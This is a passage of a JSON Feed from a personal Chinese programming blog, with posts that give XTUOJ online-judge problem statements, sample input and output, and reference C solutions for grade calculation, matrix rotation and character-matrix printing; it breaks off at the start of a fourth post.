{
    "version": "https://jsonfeed.org/version/1",
    "title": null,
    "subtitle": "祝眉目舒展，顺问冬安",
    "icon": "https://mangpumo.github.io/images/favicon.ico",
    "description": "欢迎来到 Mang Pumo 的个人博客!",
    "home_page_url": "https://MangPumo.github.io",
    "items": [
        {
            "id": "https://mangpumo.github.io/2022/11/26/XTUOJ-1297Homework/",
            "url": "https://mangpumo.github.io/2022/11/26/XTUOJ-1297Homework/",
            "title": "XTUOJ_1297Homework",
            "date_published": "2022-11-26T01:10:28.000Z",
            "content_html": "<h1 id=\"homework\"><a class=\"anchor\" href=\"#homework\">#</a> Homework</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>鉴于很多同学 Ctrl+A,Ctrl+C,Ctrl+V 的问题，Eric 想重新计算一下作业成绩，成绩计算的规则如下：</p>\n<p>1. 每道题按正确提交的先后顺序给分，第 1-12 名 32，13-24 名 16 分，25-48 名 8 分，49-96 名 4 分，97-192 名 2 分，其余 1 分。<br>\n2. 学生所有题目的分数累加和为其积分。<br>\n3. 作业成绩 = round (100+log (1+(本人积分−最高积分)/ 最高积分)×10)，其中 round 为四舍五入取整，log 以自然对数为底。<br>\nEric 已经通过查询数据库得到每个人每道题的排名情况，请写一个程序帮 Eric 算一下所有人的作业成绩。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>输入包含若干行，每行是三个部分，题目号，学号，排名。<br>\n学生人数不超过 500，题目数量不超过 200。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>输出学号和成绩，按成绩逆序，学号，并按作业成绩逆序，学号正序排列显示。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1054 2015551111 1</span><br><span class=\"line\">1054 2015551101 2</span><br><span class=\"line\">1054 2015551119 3</span><br><span class=\"line\">1054 2015551115 4</span><br><span class=\"line\">1054 2015551110 5</span><br><span class=\"line\">1054 2015551114 6</span><br><span class=\"line\">1054 2015551128 7</span><br><span class=\"line\">1054 2015551118 8</span><br><span class=\"line\">1054 2015551102 9</span><br><span class=\"line\">1054 2015551130 10</span><br><span class=\"line\">1054 2015551139 11</span><br><span class=\"line\">1054 2015551135 12</span><br><span class=\"line\">1054 2015551120 13</span><br><span class=\"line\">1054 2015551129 14</span><br><span class=\"line\">1054 2015551104 15</span><br><span class=\"line\">1054 2015551112 16</span><br><span class=\"line\">1054 2015551116 17</span><br><span class=\"line\">1054 2015551138 18</span><br><span class=\"line\">1054 2015551103 19</span><br><span class=\"line\">1054 2015551131 20</span><br><span class=\"line\">1054 2015551132 21</span><br><span class=\"line\">1054 2015551106 22</span><br><span class=\"line\">1054 2015551136 23</span><br><span class=\"line\">1054 2015551124 24</span><br><span class=\"line\">1054 2015551126 25</span><br><span class=\"line\">1054 2015551113 26</span><br><span class=\"line\">1054 2015551109 27</span><br><span class=\"line\">1054 2015551117 28</span><br><span class=\"line\">1054 2015551125 29</span><br><span class=\"line\">1054 2015551127 30</span><br><span class=\"line\">1054 2015551123 31</span><br><span class=\"line\">1054 2015551133 32</span><br><span class=\"line\">1054 2015551134 33</span><br><span class=\"line\">1054 2015551121 34</span><br><span class=\"line\">1054 2015551122 35</span><br><span class=\"line\">1054 2015551137 36</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2015551101 100</span><br><span class=\"line\">2015551102 100</span><br><span class=\"line\">2015551110 100</span><br><span class=\"line\">2015551111 100</span><br><span class=\"line\">2015551114 100</span><br><span class=\"line\">2015551115 100</span><br><span class=\"line\">2015551118 100</span><br><span class=\"line\">2015551119 100</span><br><span class=\"line\">2015551128 100</span><br><span class=\"line\">2015551130 100</span><br><span class=\"line\">2015551135 100</span><br><span class=\"line\">2015551139 100</span><br><span class=\"line\">2015551103 93</span><br><span class=\"line\">2015551104 93</span><br><span class=\"line\">2015551106 93</span><br><span class=\"line\">2015551112 93</span><br><span class=\"line\">2015551116 93</span><br><span class=\"line\">2015551120 93</span><br><span class=\"line\">2015551124 93</span><br><span class=\"line\">2015551129 93</span><br><span class=\"line\">2015551131 93</span><br><span class=\"line\">2015551132 93</span><br><span class=\"line\">2015551136 93</span><br><span class=\"line\">2015551138 93</span><br><span class=\"line\">2015551109 86</span><br><span class=\"line\">2015551113 86</span><br><span class=\"line\">2015551117 86</span><br><span class=\"line\">2015551121 86</span><br><span class=\"line\">2015551122 86</span><br><span class=\"line\">2015551123 86</span><br><span class=\"line\">2015551125 86</span><br><span class=\"line\">2015551126 86</span><br><span class=\"line\">2015551127 86</span><br><span class=\"line\">2015551133 86</span><br><span class=\"line\">2015551134 86</span><br><span class=\"line\">2015551137 86</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;math.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 a[501];</span><br><span class=\"line\">int b[501];</span><br><span class=\"line\">//数组a存学号，数组b存排名，通过下标联系</span><br><span class=\"line\">int trans(int x)</span><br><span class=\"line\">&#123;//积分转换函数</span><br><span class=\"line\">    if(x&gt;=1&amp;&amp;x&lt;=12)</span><br><span class=\"line\">        x = 32;</span><br><span class=\"line\">    else if(x&gt;=13&amp;&amp;x&lt;=24)</span><br><span class=\"line\">        x = 16;</span><br><span class=\"line\">    else if(x&gt;=25&amp;&amp;x&lt;=48)</span><br><span class=\"line\">        x = 8;</span><br><span class=\"line\">    else if(x&gt;=49&amp;&amp;x&lt;=96)</span><br><span class=\"line\">        x = 4;</span><br><span class=\"line\">    else if(x&gt;=97&amp;&amp;x&lt;=192)</span><br><span class=\"line\">        x = 2;</span><br><span class=\"line\">    else if(x&gt;=193)</span><br><span class=\"line\">        x = 1;</span><br><span class=\"line\">    return x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int swap(int x,int y)</span><br><span class=\"line\">&#123;//交换位置函数</span><br><span class=\"line\">    int temp;</span><br><span class=\"line\">    temp = a[x];</span><br><span class=\"line\">    a[x] = a[y];</span><br><span class=\"line\">    a[y] = temp;</span><br><span class=\"line\">    </span><br><span class=\"line\">    temp = b[x];</span><br><span class=\"line\">    b[x] = b[y];</span><br><span class=\"line\">    b[y] = temp;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    memset(a,0,sizeof(a));</span><br><span class=\"line\">    memset(b,0,sizeof(b));</span><br><span class=\"line\">    int n;//题号</span><br><span class=\"line\">    int rank;//排名</span><br><span class=\"line\">    int flag = 1;//学号</span><br><span class=\"line\">    int i,j,k;</span><br><span class=\"line\">    </span><br><span class=\"line\">    while(scanf(&quot;%d %I64d %d&quot;,&amp;n,&amp;a[flag],&amp;rank) != EOF)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        for(i=0; i&lt;flag; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(a[i] == a[flag])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        //排名转换为积分</span><br><span class=\"line\">        b[i] += trans(rank);</span><br><span class=\"line\">        if(i == flag)</span><br><span class=\"line\">            flag++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    int num,judge=1;</span><br><span class=\"line\">    num = flag-1;</span><br><span class=\"line\">    while(judge)</span><br><span class=\"line\">    &#123;//冒泡将积分排序</span><br><span class=\"line\">        judge = 0;</span><br><span class=\"line\">        for(i=1;i&lt;num;i++)//注意i的初始值</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if(b[i]&lt;b[i+1])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                swap(i,i+1);</span><br><span class=\"line\">                judge = 1;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    double q,w;</span><br><span class=\"line\">    q = b[1];</span><br><span class=\"line\">    for(i=1; i&lt;=num; i++)//没有=会变得不幸，（最后一位会只有积分值）</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        w = log(b[i]/q)*10+100.5;</span><br><span class=\"line\">        b[i] = w;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for(i = 1; i&lt;num; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        k = i;</span><br><span class=\"line\">        while(b[i] == b[i+1])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        judge = 1;</span><br><span class=\"line\">        while(judge)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            judge = 0;</span><br><span class=\"line\">            for(j=k;j&lt;i;j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                if(a[j]&gt;a[j+1])</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    swap(j,j+1);</span><br><span class=\"line\">                    judge = 1;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for(i=1;i&lt;=num;i++)</span><br><span class=\"line\">        printf(&quot;%I64d %d\\n&quot;,a[i],b[i]);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/26/XTUOJ-1365Rotate/",
            "url": "https://mangpumo.github.io/2022/11/26/XTUOJ-1365Rotate/",
            "title": "XTUOJ_1365Rotate",
            "date_published": "2022-11-26T01:06:25.000Z",
            "content_html": "<h1 id=\"rotate\"><a class=\"anchor\" href=\"#rotate\">#</a> Rotate</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>一个 4×4 的矩阵，我们可以把矩阵看成内外两圈，我们可以把外圈按顺时钟或者逆时钟转动，每次转动 90 度。 我们想得到一个 2×2 的子矩阵，使得这个子矩阵 4 个元素的累加和最大。请问最大子矩阵的元素累加和是多少？</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>第一行是一个整数 T (1≤T≤1000)，表示样例的个数。 每个样例占 4 行，每行 4 个整数，所有元素在 [1,1000] 范围内。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>每行输出一个样例的结果。</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">1 2 3 4</span><br><span class=\"line\">5 6 7 8</span><br><span class=\"line\">9 10 11 12</span><br><span class=\"line\">13 14 15 16</span><br><span class=\"line\">1 1 2 2</span><br><span class=\"line\">3 3 4 4</span><br><span class=\"line\">2 2 1 1</span><br><span class=\"line\">4 4 3 3</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">54</span><br><span class=\"line\">14</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"提示\"><a class=\"anchor\" href=\"#提示\">#</a> 提示</h2>\n<p>第一个样例，最大子矩阵为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">11 12</span><br><span class=\"line\">15 16</span><br></pre></td></tr></table></figure><br>\n 第二个样例，顺时钟旋转两次，得到最大子矩阵为<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">3 4 </span><br><span class=\"line\">3 4 </span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int T;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class=\"line\">    int a[16];</span><br><span class=\"line\">    int b[4][4];</span><br><span class=\"line\">    int max;</span><br><span class=\"line\">    int i,j,m;</span><br><span class=\"line\">    </span><br><span class=\"line\">    while(T--)//输入4X4矩阵</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        for(i=0;i&lt;4;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(j=0;j&lt;4;j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                scanf(&quot;%d&quot;,&amp;b[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        m = 4;//旋转次数，转动90°</span><br><span class=\"line\">        max = b[0][1]+b[0][0]+b[1][0]+b[1][1];//初始化，=0也可</span><br><span class=\"line\">        while(m--)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(i=0;i&lt;3;i++)//遍历矩阵寻找最大2X2子矩阵</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                for(j=0;j&lt;3;j++)//注意不要大于4，会越界</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    if(b[i][j]+b[i][j+1]+b[i+1][j]+b[i+1][j+1] &gt; max)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                        max = b[i][j]+b[i][j+1]+b[i+1][j]+b[i+1][j+1];</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            if(m == 0)//一圈后退出</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            for(i=0;i&lt;4;i++)//暂存原矩阵最外圈</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                a[i] = b[0][i];</span><br><span class=\"line\">                a[i+4] = b[3][i];</span><br><span class=\"line\">                a[i+8] = b[i][0];</span><br><span class=\"line\">                a[i+12] = b[i][3];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            for(i=0;i&lt;4;i++)//旋转后的结果存入</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                b[i][3] = a[i];</span><br><span class=\"line\">                b[i][0] = a[i+4];</span><br><span class=\"line\">                b[0][3-i] = a[i+8];</span><br><span class=\"line\">                b[3][3-i] = a[i+12];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,max);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/26/XTUOJ-1327%E5%AD%97%E7%AC%A6%E7%9F%A9%E9%98%B5/",
            "url": "https://mangpumo.github.io/2022/11/26/XTUOJ-1327%E5%AD%97%E7%AC%A6%E7%9F%A9%E9%98%B5/",
            "title": "XTUOJ_1327字符矩阵",
            "date_published": "2022-11-26T01:03:16.000Z",
            "content_html": "<h1 id=\"字符矩阵\"><a class=\"anchor\" href=\"#字符矩阵\">#</a> 字符矩阵</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述</h2>\n<p>按照示例的规律输出字符矩阵。 比如输入字母 D 时，输出字符矩阵如下<br>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ABCDCBA</span><br><span class=\"line\">BBCDCBB</span><br><span class=\"line\">CCCDCCC</span><br><span class=\"line\">DDDDDDD</span><br><span class=\"line\">CCCDCCC</span><br><span class=\"line\">BBCDCBB</span><br><span class=\"line\">ABCDCBA</span><br></pre></td></tr></table></figure><br>\n 字符矩阵行首、尾都无空格。</p>\n<h2 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h2>\n<p>每行一个大写英文字母，如果字符为 #，表示输入结束，不需要处理。</p>\n<h2 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h2>\n<p>依次输出对应的字符矩阵</p>\n<h2 id=\"样例输入\"><a class=\"anchor\" href=\"#样例输入\">#</a> 样例输入</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A</span><br><span class=\"line\">B</span><br><span class=\"line\">C</span><br><span class=\"line\">#</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"样例输出\"><a class=\"anchor\" href=\"#样例输出\">#</a> 样例输出</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A</span><br><span class=\"line\">ABA</span><br><span class=\"line\">BBB</span><br><span class=\"line\">ABA</span><br><span class=\"line\">ABCBA</span><br><span class=\"line\">BBCBB</span><br><span class=\"line\">CCCCC</span><br><span class=\"line\">BBCBB</span><br><span class=\"line\">ABCBA</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考源码\"><a class=\"anchor\" href=\"#参考源码\">#</a> 参考源码</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;math.h&gt;</span><br><span class=\"line\">int min(int a,int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(a&gt;=b)</span><br><span class=\"line\">        return b;</span><br><span class=\"line\">    else</span><br><span class=\"line\">        return a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char m;</span><br><span class=\"line\">    char cnt[55][55];</span><br><span class=\"line\">    while(scanf(&quot;%c&quot;,&amp;m)!=EOF&amp;&amp;m!=&#x27;#&#x27;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int n= m-&#x27;A&#x27;+1;</span><br><span class=\"line\">        int i,j;</span><br><span class=\"line\">        for(i=0;i&lt;2*n-1;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(j=0;j&lt;2*n-1;j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                cnt[i][j] = m-min(abs(n-i-1),abs(n-j-1));//利用n-i-1与行的关系以及绝对值的利用进行输出6666</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i=0;i&lt;2*n-1;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            for(j=0;j&lt;2*n-1;j++)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                printf(&quot;%c&quot;,cnt[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            printf(&quot;\\n&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2022/11/26/XTUOJ-1326Diagram/",
            "url": "https://mangpumo.github.io/2022/11/26/XTUOJ-1326Diagram/",
            "title": "XTUOJ_1326Diagram",
            "date_published": "2022-11-26T00:57:01.000Z",
